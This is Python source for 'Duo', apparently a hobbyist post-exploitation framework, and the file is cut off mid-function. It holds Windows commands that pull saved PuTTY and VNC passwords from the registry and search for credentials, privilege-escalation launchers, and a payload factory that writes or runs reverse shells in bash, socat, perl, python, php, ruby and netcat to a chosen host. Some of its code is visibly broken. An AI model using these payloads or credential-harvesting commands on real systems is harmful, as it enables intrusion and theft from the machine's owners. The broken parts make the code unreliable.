try:
    import os
    import sys
    import requests
    import warnings
    import contextlib
    import subprocess
    from time import sleep
    from colorama import Fore, Back, Style
    from urllib3.exceptions import InsecureRequestWarning
except: 
    print("Please install the required modules!")

# Duo
# 6/21/21
# Made by https://github.com/0x1CA3

def loading_start():
    print("Loading the Duo Framework...  ", end='', flush=True)
    for x in range(3):
        for frame in r'-\|/-\|/':
            print('\b', frame, sep='', end='', flush=True)
            sleep(0.2)
    print('\b ')

class help_and_other(object):
    def help_windows_main():
        help_windows_menu = f"""
        {Fore.RED}Commands                {Fore.GREEN}Description
        {Fore.RED}--------                {Fore.GREEN}-----------
        {Fore.RED}help                    {Fore.GREEN}Displays commands.
        {Fore.RED}post                    {Fore.GREEN}Loads options for post-exploitation.
        {Fore.RED}wsl                     {Fore.GREEN}Loads WSL. [Windows-Subsystem-For-Linux]
        {Fore.RED}cmd                     {Fore.GREEN}Lets you execute a system command.
        {Fore.RED}banner                  {Fore.GREEN}Displays the banner.
        {Fore.RED}clear                   {Fore.GREEN}Clears the screen.
        """
        print(help_windows_menu)
    
    def help_linux_main():
        help_linux_menu = """
        dfesfsefsef
        fsefsefsefsefs
        fsefsef
        """
        print(help_linux_menu)
    
    def clear():
        if os.name == "nt": os.system("cls")
        else: os.system("clear")
    
    def wincmd():
        print("To go back to the main menu, use the 'back' command.")
        while True:
            cmdinput = input(f"\n{Fore.RED}user@ter{Fore.GREEN}minal~$ ")
            if cmdinput == "back": windows()
            else: os.system("{}".format(cmdinput))

    def pshell():
        print("To go back to the main menu, use the 'back' command.")
        while True:
            pinput = input(f"\n{Fore.RED}user@power{Fore.GREEN}shell~$ ")
            if pinput == "back": windows()
            else: os.system("powershell.exe {}".format(pinput))
    
    banner = f"""
                            {Fore.RED}╔╦╗┬ {Fore.GREEN}┬┌─┐
                            {Fore.RED} ║║│ {Fore.GREEN}││ │
                            {Fore.RED}═╩╝└{Fore.RED}{Fore.GREEN}─┘└─┘
               [Made by https://github.com/brows3r]
                     Use 'help' for commands!
    """
    def scripts_post_menu():
        scripts_post_com = f"""
        {Fore.RED}Commands                {Fore.GREEN}Description
        {Fore.RED}--------                {Fore.GREEN}-----------
        {Fore.RED}help                    {Fore.GREEN}Displays commands.
        {Fore.RED}list                    {Fore.GREEN}Lists all available scripts.
        {Fore.RED}use [specific/script]   {Fore.GREEN}Uses specified script.
        {Fore.RED}clear                   {Fore.GREEN}Clears the screen.
        {Fore.RED}back                    {Fore.GREEN}Goes back to the post-exploitation menu.
        """
        print(scripts_post_com)
    
    def payload_main_menu():
        payload_menu = f"""
        {Fore.RED}Commands                   {Fore.GREEN}Description
        {Fore.RED}--------                   {Fore.GREEN}-----------
        {Fore.RED}help                       {Fore.GREEN}Displays commands.
        {Fore.RED}list                       {Fore.GREEN}Lists all of the available payloads.
        {Fore.RED}create [specific/payload]  {Fore.GREEN}Creates the specified payload.
        {Fore.RED}cmd                        {Fore.GREEN}Lets you execute a system command.
        {Fore.RED}clear                      {Fore.GREEN}Clears the screen.
        """
        print(payload_menu)
    
    def payload_list_all():
        print(f''' 
        {Fore.RED}Payloads                                    {Fore.GREEN}Description
        {Fore.RED}--------                                    {Fore.GREEN}-----------
        {Fore.RED}payloads/reverse/bash/tcp                   {Fore.GREEN}Bash TCP reverse shell payload.
        {Fore.RED}payloads/reverse/bash/udp                   {Fore.GREEN}Bash UDP reverse shell payload.
        {Fore.RED}payloads/reverse/socat                      {Fore.GREEN}Socat reverse shell payload.
        {Fore.RED}payloads/reverse/windows/perl               {Fore.GREEN}Windows perl reverse shell payload.
        {Fore.RED}payloads/reverse/linux/perl                 {Fore.GREEN}Linux perl reverse shell payload.
        {Fore.RED}payloads/reverse/linux/python/ipv4          {Fore.GREEN}Linux python IPv4 reverse shell payload.
        {Fore.RED}payloads/reverse/linux/python/ipv6          {Fore.GREEN}Linux python IPv6 reverse shell payload.
        {Fore.RED}payloads/reverse/php                        {Fore.GREEN}PHP reverse shell payload.
        {Fore.RED}payloads/reverse/linux/ruby                 {Fore.GREEN}Linux Ruby reverse shell payload.
        {Fore.RED}payloads/reverse/netcat                     {Fore.GREEN}Netcat reverse shell payload.
        ''')

# wstart

win_post_help = f"""
    {Fore.RED}Commands               {Fore.GREEN}Description
    {Fore.RED}--------               {Fore.GREEN}-----------
    {Fore.RED}help                   {Fore.GREEN}Displays commands.
    {Fore.RED}scripts                {Fore.GREEN}Enters into the 'Scripts' directory.
    {Fore.RED}modules                {Fore.GREEN}Enters into the 'Modules' directory.
    {Fore.RED}clear                  {Fore.GREEN}Clears the screen.
    {Fore.RED}cmd                    {Fore.GREEN}Lets you execute a system command.
    {Fore.RED}back                   {Fore.GREEN}Goes back to the main menu.
"""
def win_post_ex_scripts():
    print(f'''
    {Fore.RED}Scripts                                                          {Fore.GREEN}Description
    {Fore.RED}-------                                                          {Fore.GREEN}-----------
    {Fore.RED}scripts/net/grab_wifi                                            {Fore.GREEN}Dumps the Wi-Fi SSID.
    {Fore.RED}scripts/cmd/sys_dump                                             {Fore.GREEN}Dumps basic system information.
    {Fore.RED}scripts/cmd/get_users                                            {Fore.GREEN}Gets all users registered on the target machine.
    {Fore.RED}scripts/cmd/read_firewall_config                                 {Fore.GREEN}Gathers firewall information.
    {Fore.RED}scripts/cmd/read_registry_putty_sessions                         {Fore.GREEN}Gather information and passwords from PUTTY sessions.
    {Fore.RED}scripts/cmd/search_for_passwords                                 {Fore.GREEN}Searches for passwords on the target machine.
    {Fore.RED}scripts/cmd/search_registry_for_passwords_cu                     {Fore.GREEN}Searches registry for passwords.
    {Fore.RED}scripts/cmd/read_registry_vnc_passwords                          {Fore.GREEN}Searches the registry for VNC passwords.
    {Fore.RED}scripts/cmd/read_registry_snmp_key                               {Fore.GREEN}Query machine SNMP key in the registry to get snmp parameters.
    {Fore.RED}scripts/cmd/read_registry_run_key                                {Fore.GREEN}Query the RUN key for the current user on the target machine.
    {Fore.RED}scripts/cmd/list_network_shares                                  {Fore.GREEN}Lists all network shares.
    {Fore.RED}scripts/cmd/list_localgroups                                     {Fore.GREEN}Lists the local groups.
    {Fore.RED}scripts/cmd/list_drives                                          {Fore.GREEN}List all drives.
    {Fore.RED}scripts/cmd/get_snmp_config                                      {Fore.GREEN}Fetches current SNMP Configuration.
    {Fore.RED}scripts/cmd/list_user_privileges                                 {Fore.GREEN}Lists current user privileges.
    {Fore.RED}scripts/cmd/read_services                                        {Fore.GREEN}Reads services with WMIC. 
    {Fore.RED}scripts/cmd/list_installed_updates                               {Fore.GREEN}Lists installed updates.
    {Fore.RED}scripts/powershell/list_unqouted_services                        {Fore.GREEN}Querying WMI to search for unquoted service paths.
    {Fore.RED}scripts/powershell/list_routing_tables                           {Fore.GREEN}Lists current routing table.
    {Fore.RED}scripts/powershell/list_network_interfaces                       {Fore.GREEN}Lists network interface.
    {Fore.RED}scripts/powershell/list_installed_programs_using_registry        {Fore.GREEN}Lists installed programs using the registry.
    {Fore.RED}scripts/powershell/list_installed_programs_using_folders         {Fore.GREEN}Lists installed programs using folders.
    {Fore.RED}scripts/powershell/list_arp_tables                               {Fore.GREEN}Lists ARP tables.
    {Fore.RED}scripts/powershell/get_iis_config                                {Fore.GREEN}Fetches IIS config.
    {Fore.RED}scripts/powershell/sensitive_data_search                         {Fore.GREEN}A script that searches for files with sensitive data.
    {Fore.RED}scripts/powershell/list_credentials                              {Fore.GREEN}A script that lists credentials.
    {Fore.RED}scripts/powershell/remove_update                                 {Fore.GREEN}A payload that removes updates for the target machine.
    {Fore.RED}scripts/powershell/get_unconstrained                             {Fore.GREEN}Script that finds machines with Unconstrained Delegation.
    {Fore.RED}scripts/extra/cmd/get_architecture                               {Fore.GREEN}Gets the processor architecture.
    {Fore.RED}scripts/extra/cmd/list_antivirus                                 {Fore.GREEN}Lists installed AV's on the target machine.
    ''')

win_postexp_scripts = \
    {
        "use scripts/net/grab_wifi": "Netsh WLAN show profiles",
        "use scripts/get_users": "NET users",
        "use scripts/sys_dump": "sysinfo",
        "use scripts/cmd/read_firewall_config": "netsh firewall show state & netsh firewall show config",
        "use scripts/cmd/read_registry_putty_sessions": "reg query 'HKCU\Software\SimonTatham\PuTTY\Sessions'",
        "use scripts/cmd/search_for_passwords": "findstr /si password *.xml *.ini *.txt *.config",
        "use scripts/cmd/search_registry_for_passwords_cu": "REG QUERY HKCU /F 'password' /t REG_SZ /S /K",
        "use scripts/cmd/read_registry_vnc_passwords": "reg query 'HKCU\Software\ORL\WinVNC3\Password'",
        "use scripts/cmd/read_registry_snmp_key": "reg query 'HKLM\SYSTEM\Current\ControlSet\Services\SNMP'",
        "use scripts/cmd/read_registry_run_key": "reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
        "use scripts/cmd/list_network_shares": "net share",
        "use scripts/cmd/list_local_groups": "net localgroup",
        "use scripts/cmd/list_drives": "wmic logicaldisk get caption,description,providername",
        "use scripts/cmd/get_snmp_config": "reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s",
        "use scripts/cmd/list_user_privileges": "whoami /priv",
        "use scripts/cmd/read_services": "wmic service list brief",
        "use scripts/cmd/list_installed_updates": "wmic qfe",
        "use scripts/powershell/list_unqouted_services": "powershell.exe Get-Content scripts/unquoteservice.ps1 | PowerShell.exe -noprofile -",
        "use scripts/powershell/list_routing_tables": "powershell.exe Get-Content scripts/routingtable.ps1 | PowerShell.exe -noprofile -",
        "use scripts/powershell/list_network_interfaces": "powershell.exe Get-Content scripts/listnetworkinter.ps1 | PowerShell.exe -noprofile -",
        "use scripts/powershell/list_installed_programs_using_registry": "powershell.exe Get-Content scripts/listprogramsreg.ps1 | PowerShell.exe -noprofile -",
        "use scripts/powershell/list_installed_programs_using_folders": "powershell.exe Get-Content scripts/listprogramsfol.ps1 | PowerShell.exe -noprofile -",
        "use scripts/powershell/list_arp_tables": "powershell.exe Get-Content scripts/listarptables.ps1 | PowerShell.exe -noprofile -",
        "use scripts/powershell/get_iis_config": "powershell.exe Get-Content scripts/iisconfig.ps1 | PowerShell.exe -noprofile -",
        "use scripts/powershell/sensitive_data_search": "powershell.exe Get-Content scripts/sensitive_data_search.ps1 | PowerShell.exe -noprofile -",
        "use scripts/powershell/list_credentials": "powershell.exe Get-Content scripts/listcredentials.ps1 | PowerShell.exe -noprofile -",
        "use scripts/powershell/remove_update": "powershell.exe Get-Content scripts/removeupdate.ps1 | PowerShell.exe -noprofile -",
        "use scripts/powershell/get_unconstrained": "cd scripts && PowerShell.exe -ExecutionPolicy Bypass -File ./getunconstrained.ps1",
        "use scripts/extra/cmd/get_architecture": "wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE%",
        "use scripts/extra/cmd/list_antivirus": "cd scripts && list_antivirus.bat"
    }

class scripts_and_modules_cmd(object):
    def win_post_cmd():
        print("To go back to the main menu, use the 'back' command.")
        while True:
            win_post_input_cmd = input(f"\n{Fore.RED}user@ter{Fore.GREEN}minal~$ ")
            if win_post_input_cmd == "back": win_post_ex()
            os.system("{}".format(win_post_input_cmd))

win_post_scripts_com = \
    {
        "help": help_and_other.scripts_post_menu,
        "clear": help_and_other.clear,
        "list": win_post_ex_scripts
    }

def commands_modules_post_win():
    winpostmoduleshelpmenu = f"""
    {Fore.RED}Commands               {Fore.GREEN}Description
    {Fore.RED}--------               {Fore.GREEN}-----------
    {Fore.RED}help                   {Fore.GREEN}Displays commands.
    {Fore.RED}list                   {Fore.GREEN}Lists all of the available modules.
    {Fore.RED}use [specific/module]  {Fore.GREEN}Uses specified module.
    {Fore.RED}clear                  {Fore.GREEN}Clears the screen.
    {Fore.RED}back                   {Fore.GREEN}Goes back to the main menu.
    """
    print(winpostmoduleshelpmenu)

# credits to https://github.com/M4ximuss/ for the 'powerless' script
# credits to https://github.com/carlospolop/ for the 'WinPEAS' script
# credits to https://github.com/joshuaruppe/ for the 'winprivesc' script

cmd_module_list = f"""
    {Fore.RED}Modules                               {Fore.GREEN}Description
    {Fore.RED}-------                               {Fore.GREEN}-----------
    {Fore.RED}modules/vuln/eternal_blue             {Fore.GREEN}Checks if target machine is vulnerable to "Eternal Blue".
    {Fore.RED}modules/vuln/netapi                   {Fore.GREEN}Checks if target machine is vulnerable to "MS08-067". [Netapi]
    {Fore.RED}modules/vuln/router_find              {Fore.GREEN}Tries to identify the IP address of the target machines router.
    {Fore.RED}modules/escalate/winpeas              {Fore.GREEN}WinPEAS searches for paths to escalate privileges on Windows.
    {Fore.RED}modules/escalate/powerless            {Fore.GREEN}A Windows privilege escalation module.
    {Fore.RED}modules/escalate/winprivesc           {Fore.GREEN}A module for Windows enumeration and finding privilege escalation routes.
    """

# credits go out to multiple stackoverflow threads for helping me out with the SSL bypass!
old_merge_environment_settings = requests.Session.merge_environment_settings
@contextlib.contextmanager
def sslbypass():
    opened_adapters = set()

    def merge_environment_settings(self, url, proxies, stream, verify, cert):
        opened_adapters.add(self.get_adapter(url))

        settings = old_merge_environment_settings(self, url, proxies, stream, verify, cert)
        settings['verify'] = False

        return settings

    requests.Session.merge_environment_settings = merge_environment_settings

    try:
        with warnings.catch_warnings():
            warnings.simplefilter('ignore', InsecureRequestWarning)
            yield
    finally:
        requests.Session.merge_environment_settings = old_merge_environment_settings

        for adapter in opened_adapters:
            try:
                adapter.close()
            except:
                pass

def win_post_modules():
    commands_modules_post = \
        {
            "help": commands_modules_post_win,
            "clear": help_and_other.clear
        }
    modules_post_win = \
        {
            "use modules/vuln/eternal_blue": "nmap -Pn -p445 --open --max-hostgroup 3 --script smb-vuln-ms17–010 localhost",
            "use modules/vuln/netapi": "nmap -Pn -p445 --open --max-hostgroup 3 --script smb-vuln-ms08-067 localhost",
            "use modules/escalate/winpeas": "cd escalate && winPEAS.bat",
            "use modules/escalate/powerless": "cd escalate && Powerless.bat",
            "use modules/escalate/winprivesc": "cd escalate && winprivesc.bat"
        }
    modules_post_wrong_modules = \
        {
            "hlpe": "echo [hlpe] is not a valid command, perhaps you meant [help]?",
            "hlep": "echo [hlep] is not a valid command, perhaps you meant [help]?",
            "hpel": "echo [hpel] is not a valid command, perhaps you meant [help]?",
            "lsit": "echo [lsit] is not a valid command, perhaps you meant [list]?",
            "ltis": "echo [ltis] is not a valid command, perhaps you meant [list]?",
            "ltsi": "echo [ltsi] is not a valid command, perhaps you meant [list]?",
            "lsti": "echo [lsti] is not a valid command, perhaps you meant [list]?",
            "lits": "echo [lits] is not a valid command, perhaps you meant [list]?",
            "bcak": "echo [bcak] is not a valid command, perhaps you meant [back]?",
            "bkac": "echo [bkac] is not a valid command, perhaps you meant [back]?",
            "bkca": "echo [bkca] is not a valid command, perhaps you meant [back]?",
            "backa": "echo [backa] is not a valid command, perhaps you meant [back]?",
            "clea": "echo [clea] is not a valid command, perhaps you meant [clear]?",
            "cealr": "echo [cealr] is not a valid command, perhaps you meant [clear]?",
            "claer": "echo [claer] is not a valid command, perhaps you meant [clear]?",
            "clwaer": "echo [clwaer] is not a valid command, perhaps you meant [clear]?",
            "celar": "echo [celar] is not a valid command, perhaps you meant [clear]?"
        }
    while True:
        win_post_module_shell = input(f"{Fore.RED}\n╭─user@duo [duo/post{Fore.GREEN}/modules]\n{Fore.GREEN}╰───$ ")
        if win_post_module_shell in commands_modules_post:
            try:
                commands_modules_post[win_post_module_shell]()
            except:
                print("Failed to execute command properly!")
        if win_post_module_shell in modules_post_win:
            try:
                subprocess.call(modules_post_win[win_post_module_shell], shell=True)
            except:
                print("Failed to run module properly!")
        elif win_post_module_shell == "list": print(cmd_module_list)
        elif win_post_module_shell == "back": win_post_ex()
        elif win_post_module_shell == "use modules/vuln/router_find":
            with sslbypass():
                url1 = "http://192.168.100.1/"
                url2 = "http://192.168.0.1/"
                url1re = requests.get(url1)
                url2re = requests.get(url2)
                if url1re.status_code == 200:
                    print(f"{Fore.GREEN}[+] Router IP found! - {Fore.RED}192.168.100.1")
                    if url2re.status_code == 200:
                        print(f"{Fore.GREEN}[+] Router IP found! - {Fore.RED}192.168.0.1")
                    else:
                        print(f"{Fore.RED}Router IP check (2/2) Failed!")
                else:
                    print(f"{Fore.RED}Router IP check (1/2) Failed!")
        else:
            if win_post_module_shell in modules_post_wrong_modules:
                subprocess.call(modules_post_wrong_modules[win_post_module_shell], shell=True)

def win_post_ex():
    win_com_post = \
        {
            "cmd": scripts_and_modules_cmd.win_post_cmd,
            "clear": help_and_other.clear,
            "modules": win_post_modules
        }
    win_com_wrong = \
        {
            "clea": "echo [clea] is not a valid command, perhaps you meant [clear]?",
            "cealr": "echo [cealr] is not a valid command, perhaps you meant [clear]?",
            "claer": "echo [claer] is not a valid command, perhaps you meant [clear]?",
            "clwaer": "echo [clwaer] is not a valid command, perhaps you meant [clear]?",
            "celar": "echo [celar] is not a valid command, perhaps you meant [clear]?",
            "hlpe": "echo [hlpe] is not a valid command, perhaps you meant [help]?",
            "hlep": "echo [hlep] is not a valid command, perhaps you meant [help]?",
            "hpel": "echo [hpel] is not a valid command, perhaps you meant [help]?",
            "lsit": "echo [lsit] is not a valid command, perhaps you meant [list]?",
            "ltis": "echo [ltis] is not a valid command, perhaps you meant [list]?",
            "ltsi": "echo [ltsi] is not a valid command, perhaps you meant [list]?",
            "lsti": "echo [lsti] is not a valid command, perhaps you meant [list]?",
            "lits": "echo [lits] is not a valid command, perhaps you meant [list]?",
            "bcak": "echo [bcak] is not a valid command, perhaps you meant [back]?",
            "bkac": "echo [bkac] is not a valid command, perhaps you meant [back]?",
            "bkca": "echo [bkca] is not a valid command, perhaps you meant [back]?",
            "backa": "echo [backa] is not a valid command, perhaps you meant [back]?"
        }
    post_ex_wrong = \
        {
            "hlpe": "echo [hlpe] is not a valid command, perhaps you meant [help]?",
            "hlep": "echo [hlep] is not a valid command, perhaps you meant [help]?",
            "hpel": "echo [hpel] is not a valid command, perhaps you meant [help]?",
            "clea": "echo [clea] is not a valid command, perhaps you meant [clear]?",
            "cealr": "echo [cealr] is not a valid command, perhaps you meant [clear]?",
            "claer": "echo [claer] is not a valid command, perhaps you meant [clear]?",
            "clwaer": "echo [clwaer] is not a valid command, perhaps you meant [clear]?",
            "celar": "echo [celar] is not a valid command, perhaps you meant [clear]?",
            "cdm": "echo [cdm] is not a valid command, perhaps you meant [cmd]?",
            "bcak": "echo [bcak] is not a valid command, perhaps you meant [back]?",
            "bkac": "echo [bkac] is not a valid command, perhaps you meant [back]?",
            "bkca": "echo [bkca] is not a valid command, perhaps you meant [back]?",
            "backa": "echo [backa] is not a valid command, perhaps you meant [back]?",
            "scirpst": "echo [scirpst] is not a valid command, perhaps you meant [scripts]?",
            "scpirts": "echo [scpirts] is not a valid command, perhaps you meant [scripts]?",
            "scipts": "echo [scipts] is not a valid command, perhaps you meant [scripts]?",
            "scpits": "echo [scpits] is not a valid command, perhaps you meant [scripts]?",
            "scitps": "echo [scitps] is not a valid command, perhaps you meant [scripts]?",
            "modlse": "echo [modlse] is not a valid command, perhaps you meant [modules]?",
            "moduiesl": "echo [moduiesl] is not a valid command, perhaps you meant [modules]?",
            "moduels": "echo [moduels] is not a valid command, perhaps you meant [modules]?",
            "moduesl": "echo [moduesl] is not a valid command, perhaps you meant [modules]?",
        }
    while True:
        win_post_shell = input(f"{Fore.RED}\n╭─user@duo [duo/{Fore.GREEN}post]\n{Fore.GREEN}╰───$ ")
        if win_post_shell in win_com_post:
            try:
                win_com_post[win_post_shell]()
            except:
                print("Command failed to execute properly!")
        elif win_post_shell == "help": print(win_post_help)
        elif win_post_shell == "scripts":
            while True:
                win_scripts_post = input(f"{Fore.RED}\n╭─user@duo [duo/post/scripts]\n{Fore.GREEN}╰───$ ")
                if win_scripts_post in win_postexp_scripts:
                    try:
                        subprocess.call(win_postexp_scripts[win_scripts_post], shell=True)
                    except:
                        print("Script failed to execute properly!")
                elif win_scripts_post in win_post_scripts_com:
                    try:
                        win_post_scripts_com[win_scripts_post]()
                    except:
                        print("Command failed to execute properly!")
                elif win_scripts_post == "back": win_post_ex()
                else:
                    if win_scripts_post in win_com_wrong: 
                        subprocess.call(win_com_wrong[win_scripts_post], shell=True)
                    else: print(f"Error! Command [{win_scripts_post}] was not found!")
        elif win_post_shell == "back": windows()
        else:
            if win_post_shell in post_ex_wrong:
                subprocess.call(post_ex_wrong[win_post_shell], shell=True)
            else:
                print(f"Error! Command [{win_post_shell}] was not found!")

def wsl():
    while True:
        wslmenu = input(f"{Fore.RED}\nuser@{Fore.GREEN}wsl~$ ")
        if wslmenu == "help" or wslmenu == "list":
            print(f''' 
            {Fore.RED}WSL Modules                             {Fore.GREEN}Description
            {Fore.RED}-----------                             {Fore.GREEN}-----------
            {Fore.RED}check                                   {Fore.GREEN}Checks if WSL is installed on the target machine.  
            {Fore.RED}who                                     {Fore.GREEN}Checks what user you're on.                        
            {Fore.RED}shell                                   {Fore.GREEN}Allows you to execute reverse and bind shell code. 
            {Fore.RED}load                                    {Fore.GREEN}Loads WSL.                                         
            ''')
        elif wslmenu == "check": os.system("wsl uname -a")
        elif wslmenu == "who": os.system("wsl whoami")
        elif wslmenu == "shell":
            wslmenu = input("\nWSL (Enter reverse shell code)\n  |==> ")
            os.system("python -c '{}'".format(wslmenu))
        elif wslmenu == "load":
            print("To return to the Duo Framework, type 'exit'.")
            os.system("wsl")
        elif wslmenu == "clear": help_and_other.clear()
        elif wslmenu == "back": windows()
        else: print(f"Error! Command [{wslmenu}] was not found!")

def windows():
    windows_commands = \
        {
        "help": help_and_other.help_windows_main,
        "clear": help_and_other.clear,
        "cmd": help_and_other.wincmd,
        "post": win_post_ex,
        "wsl": wsl
        }
    wrong_command_list = \
        {
            "cdm": "echo [cdm] is not a valid command, perhaps you meant [cmd]?",
            "hlpe": "echo [hlpe] is not a valid command, perhaps you meant [help]?",
            "hlep": "echo [hlep] is not a valid command, perhaps you meant [help]?",
            "hpel": "echo [hpel] is not a valid command, perhaps you meant [help]?",
            "clea": "echo [clea] is not a valid command, perhaps you meant [clear]?",
            "cealr": "echo [cealr] is not a valid command, perhaps you meant [clear]?",
            "claer": "echo [claer] is not a valid command, perhaps you meant [clear]?",
            "clwaer": "echo [clwaer] is not a valid command, perhaps you meant [clear]?",
            "celar": "echo [celar] is not a valid command, perhaps you meant [clear]?",
            "pots": "echo [pots] is not a valid command, perhaps you meant [post]?",
            "psto": "echo [psto] is not a valid command, perhaps you meant [post]?",
            "psot": "echo [psot] is not a valid command, perhaps you meant [post]?",
            "psots": "echo [psots] is not a valid command, perhaps you meant [post]?",
            "phslel": "echo [phslel] is not a valid command, perhaps you meant [pshell]?",
            "phsell": "echo [phsell] is not a valid command, perhaps you meant [pshell]?",
            "psgell": "echo [psgell] is not a valid command, perhaps you meant [pshell]?",
            "pshel": "echo [pshel] is not a valid command, perhaps you meant [pshell]?",
            "phlse": "echo [phlse] is not a valid command, perhaps you meant [pshell]?",
            "baner": "echo [baner] is not a valid command, perhaps you meant [banner]?",
            "bnaer": "echo [bnaer] is not a valid command, perhaps you meant [banner]?",
            "bnaere": "echo [bnaere] is not a valid command, perhaps you meant [banner]?",
            "bnnaer": "echo [bnnaer] is not a valid command, perhaps you meant [banner]?",
            "banenr": "echo [banenr] is not a valid command, perhaps you meant [banner]?",
            "wls": "echo [wls] is not a valid command, perhaps you meant [wsl]?",
            "slw": "echo [slw] is not a valid command, perhaps you meant [wsl]?",
            "swl": "echo [swl] is not a valid command, perhaps you meant [wsl]?",
            "lws": "echo [lws] is not a valid command, perhaps you meant [wsl]?"
        }
    while True:
        windows_shell = input(f"{Fore.RED}\nuser@{Fore.GREEN}duo~$ ")
        if windows_shell in windows_commands:
            try:
                windows_commands[windows_shell]()
            except:
                print(f"{Fore.RED}Command has failed to execute properly!")
        elif windows_shell == "banner":
            help_and_other.clear()
            print(help_and_other.banner)
        else:
            if windows_shell in wrong_command_list:
                subprocess.call(wrong_command_list[windows_shell], shell=True)
            else:
                print(f"Error! Command [{windows_shell}] was not found!")

# wend

def payload_factory():
    payload_com = \
        {
            "help": help_and_other.payload_main_menu,
            "clear": help_and_other.clear,
            "list": help_and_other.payload_list_all
        }
    wrong_payload_commands = \
        {
            "hlpe": "echo [hlpe] is not a valid command, perhaps you meant [help]?",
            "hlep": "echo [hlep] is not a valid command, perhaps you meant [help]?",
            "hpel": "echo [hpel] is not a valid command, perhaps you meant [help]?",
            "lsit": "echo [lsit] is not a valid command, perhaps you meant [list]?",
            "ltis": "echo [ltis] is not a valid command, perhaps you meant [list]?",
            "ltsi": "echo [ltsi] is not a valid command, perhaps you meant [list]?",
            "lsti": "echo [lsti] is not a valid command, perhaps you meant [list]?",
            "lits": "echo [lits] is not a valid command, perhaps you meant [list]?",
            "cdm": "echo [cdm] is not a valid command, perhaps you meant [cmd]?",
            "clea": "echo [clea] is not a valid command, perhaps you meant [clear]?",
            "cealr": "echo [cealr] is not a valid command, perhaps you meant [clear]?",
            "claer": "echo [claer] is not a valid command, perhaps you meant [clear]?",
            "clwaer": "echo [clwaer] is not a valid command, perhaps you meant [clear]?",
            "celar": "echo [celar] is not a valid command, perhaps you meant [clear]?"
        }
    while True:
        payload_shell = input(f"\n{Fore.RED}user@payl{Fore.RED}o{Fore.GREEN}ad_factory~$ ")
        if payload_shell in payload_com:
            try:
                payload_com[payload_shell]()
            except:
                print("Command failed to execute!")
        elif payload_shell == "use payloads/reverse/bash/tcp":
            pi1 = input("Enter IP > ")
            pp1 = input("Enter Port > ")
            ppf1 = open("bash_tcp.sh", "w")
            ppf1.write(f''' 
bash -i >& /dev/tcp/{pi1}/{pp1} 0>&1
            ''')
            ppf1.close()
            print("Payload created!")
        elif payload_shell == "use payloads/reverse/bash/udp":
            pi2 = input("Enter IP > ")
            pp2 = input("Enter Port > ")
            ppf2 = input("bash_udp.sh", "w")
            ppf2.write(f''' 
sh -i >& /dev/udp/{pi2}/{pp2} 0>&1
            ''')
            ppf2.close()
            print("Payload created!")
        elif payload_shell == "use payloads/reverse/socat":
            pi3 = input("Enter IP > ")
            pp3 = input("Enter Port > ")
            subprocess.call(f"/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{pi3}:{pp3}", shell=True)
            print("Payload executed!")
        elif payload_shell == "use payloads/reverse/windows/perl":
            pi4 = input("Enter IP > ")
            pp4 = input("Enter Port > ")
            subprocess.call(f'''perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"{pi4}:{pp4}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;' ''', shell=True)
            print("Payload executed!")
        elif payload_shell == "use payloads/reverse/linux/perl":
            pi5 = input("Enter IP > ")
            pp5 = input("Enter Port > ")
            subprocess.call('''perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.0.0.1:4242");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;' ''', shell=True)
            print("Payload executed!")
        elif payload_shell == "use payloads/reverse/linux/python/ipv4":
            pi6 = input("Enter IP > ")
            pp6 = input("Enter Port > ")
            subprocess.call(f'''export RHOST="{pi6}";export RPORT={pp6};python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")' ''', shell=True)
            print("Payload executed!")
        elif payload_shell == "use payloads/reverse/linux/python/ipv6":
            pi7 = input("Enter IP > ")
            pp7 = input("Enter Port > ")
            subprocess.call(f'''python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("{pi7}",{pp7},0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");' ''')
            print("Payload executed!")
        elif payload_shell == "use payloads/reverse/php":
            pi9 = input("Enter IP > ")
            pp9 = input("Enter Port > ")
            subprocess.call(f'''php -r '$sock=fsockopen("{pi9}",{pp9});exec("/bin/sh -i <&3 >&3 2>&3");' ''', shell=True)
            print("Payload executed!")
        elif payload_shell == "use payloads/reverse/linux/ruby":
            pi10 = input("Enter IP > ")
            pp10 = input("Enter Port > ")
            subprocess.call(f'''ruby -rsocket -e'f=TCPSocket.open("{pi10}",{pp10}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)' ''', shell=True)
            print("Payload executed!")
        elif payload_shell == "use payloads/reverse/netcat":
            pi12 = input("Enter IP > ")
            pp12 = input("Enter Port > ")
            ppf12 = input("netcat_payload_bash.sh", "w")
            ppf12.write(f''' 
nc -e /bin/sh {pi12} {pp12}
            ''')
            ppf12.close()
            print("Payload created!")
        elif payload_shell == "cmd":
            print("Use the 'back' command to go back to the main menu.")
            while True:
                cmd_payload = input(f"\n{Fore.RED}user@ter{Fore.GREEN}minal~$ ")
                if cmd_payload == "back": payload_factory()
                os.system("{}".format(cmd_payload))
        else:
            if payload_shell in wrong_payload_commands:
                subprocess.call(wrong_payload_commands[payload_shell], shell=True)
            else:
                print(f"Error! Command [{payload_shell}] was not found!")

class linux_help_and_stuff(object):
    def main_menu_linux():
        mainmenulin = f"""
        {Fore.RED}Commands                {Fore.GREEN}Description
        {Fore.RED}--------                {Fore.GREEN}-----------
        {Fore.RED}help                    {Fore.GREEN}Displays commands.
        {Fore.RED}list                    {Fore.GREEN}Displays all the available scripts.
        {Fore.RED}use [specific/script]   {Fore.GREEN}Uses the specified script.
        {Fore.RED}cmd                     {Fore.GREEN}Lets you execute a system command.
        {Fore.RED}banner                  {Fore.GREEN}Loads the banner.
        {Fore.RED}clear                   {Fore.GREEN}Clears the screen.
        """
        print(mainmenulin)

    def main_menu_scripts_linux():
        print(f''' 
        {Fore.RED}Scripts                                            {Fore.GREEN}Description
        {Fore.RED}-------                                            {Fore.GREEN}-----------
